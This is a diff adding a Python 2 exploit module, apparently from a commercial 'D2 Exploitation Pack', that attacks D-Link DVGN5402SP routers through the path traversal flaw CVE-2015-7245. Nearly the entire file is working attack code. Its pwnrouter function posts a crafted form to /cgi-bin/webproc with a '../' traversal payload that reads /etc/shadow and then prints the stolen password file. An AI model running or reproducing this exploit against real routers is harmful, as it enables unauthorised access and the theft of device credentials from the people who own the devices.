@@ -1,0 +1,51 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_17'
+_vendor_ = 'd-link'
+_model_  = ['DVGN5402SP']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = 'CVE-2015-7245'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s//cgi-bin/webproc' % host)
+    c.setopt(pycurl.POST, 1)
+    c.setopt(pycurl.POSTFIELDS, "getpage=html%2Findex.html&*errorpage*=../../../../../../../../../../../etc/shadow&var%3Amenu=setup&var%3Apage=connected&var%&objaction=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh")
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '%s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  if 'root' in data:
+    print '%s vulnerable\n' % host
+    print '%s' % data 
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
